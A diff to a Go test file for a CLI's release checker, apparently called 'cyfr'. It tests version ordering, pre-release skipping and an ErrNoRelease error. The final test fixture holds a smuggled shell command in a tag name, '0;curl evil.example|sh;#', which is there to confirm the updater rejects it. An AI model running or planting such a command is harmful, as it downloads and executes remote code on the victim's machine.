@@ -5,6 +5,7 @@ package release
 
 import (
 	"context"
+	"errors"
 	"net/http"
 	"net/http/httptest"
 	"testing"
@@ -20,12 +21,15 @@ func TestIsNewer(t *testing.T) {
 		{"0.5.3", "0.5.4", false},
 		{"1.0.0", "0.9.9", true},
 		{"0.6.0", "0.5.9", true},
-		{"0.5.10", "0.5.9", true},    // numeric, not lexical, compare
-		{"v0.5.4", "0.5.3", true},    // tolerates a stray "v"
-		{"0.5.4", "dev", false},      // unreleased current -> no notice
-		{"dev", "0.5.3", false},      // unparseable latest -> no notice
-		{"0.5.4-rc1", "0.5.3", true}, // pre-release suffix ignored
-		{"0.5", "0.5.3", false},      // not three parts -> no notice
+		{"0.5.10", "0.5.9", true},                // numeric, not lexical, compare
+		{"v0.5.4", "0.5.3", false},               // a prefix is no release version
+		{"0.5.4", "dev", false},                  // unreleased current -> no notice
+		{"dev", "0.5.3", false},                  // unparseable latest -> no notice
+		{"0.5.4-rc1", "0.5.3", true},             // a later line's pre-release
+		{"0.6.0", "0.6.0-alpha.1", true},         // the release after its pre-release
+		{"0.6.0-alpha.1", "0.6.0", false},        // a pre-release before its release
+		{"0.6.0-alpha.2", "0.6.0-alpha.1", true}, // pre-releases in order
+		{"0.5", "0.5.3", false},                  // not three parts -> no notice
 		{"", "0.5.3", false},
 	}
 	for _, c := range cases {
@@ -91,16 +95,44 @@ func TestLatestNon200(t *testing.T) {
 	}
 }
 
+// No release that is not a pre-release answers ErrNoRelease, whether the
+// list is empty, holds only other tags or only pre-releases, flagged by
+// GitHub or by their tag alone.
 func TestLatestNoReleases(t *testing.T) {
-	withAPIURL(t, `[{"tag_name": "porta-v1.0.0"}]`, http.StatusOK)
-
-	if _, err := Latest(context.Background()); err == nil {
-		t.Error("Latest should return an error when no bare-semver release exists")
+	for name, body := range map[string]string{
+		"none":                 `[]`,
+		"a desktop release":    `[{"tag_name": "porta-v1.0.0"}]`,
+		"flagged pre-releases": `[{"tag_name": "0.6.0-alpha.1", "prerelease": true}, {"tag_name": "0.6.0", "prerelease": true}]`,
+		"pre-release tags":     `[{"tag_name": "0.6.0-alpha.1"}, {"tag_name": "0.6.0-beta.1"}]`,
+		"a draft":              `[{"tag_name": "0.6.0", "draft": true}]`,
+	} {
+		withAPIURL(t, body, http.StatusOK)
+		if _, err := Latest(context.Background()); !errors.Is(err, ErrNoRelease) {
+			t.Errorf("%s: Latest = %v, want ErrNoRelease", name, err)
+		}
 	}
 }
 
-// `cyfr upgrade` names release URLs and file names from the tag, so a tag
-// that is not plain MAJOR.MINOR.PATCH must never be selected.
+// A pre-release tag GitHub does not flag is skipped all the same, and a
+// later release outranks it.
+func TestLatestSkipsPrereleaseTags(t *testing.T) {
+	withAPIURL(t, `[
+		{"tag_name": "0.7.0-rc.1"},
+		{"tag_name": "0.6.0"},
+		{"tag_name": "0.6.0-alpha.1", "prerelease": true}
+	]`, http.StatusOK)
+
+	got, err := Latest(context.Background())
+	if err != nil {
+		t.Fatalf("Latest returned error: %v", err)
+	}
+	if got != "0.6.0" {
+		t.Errorf("Latest = %q, want %q", got, "0.6.0")
+	}
+}
+
+// `cyfr update` names release URLs and file names from the tag, so a tag
+// that is no release version must never be selected.
 func TestLatestRejectsShellMetacharacters(t *testing.T) {
 	withAPIURL(t, `[
 		{"tag_name": "0;curl evil.example|sh;#"},
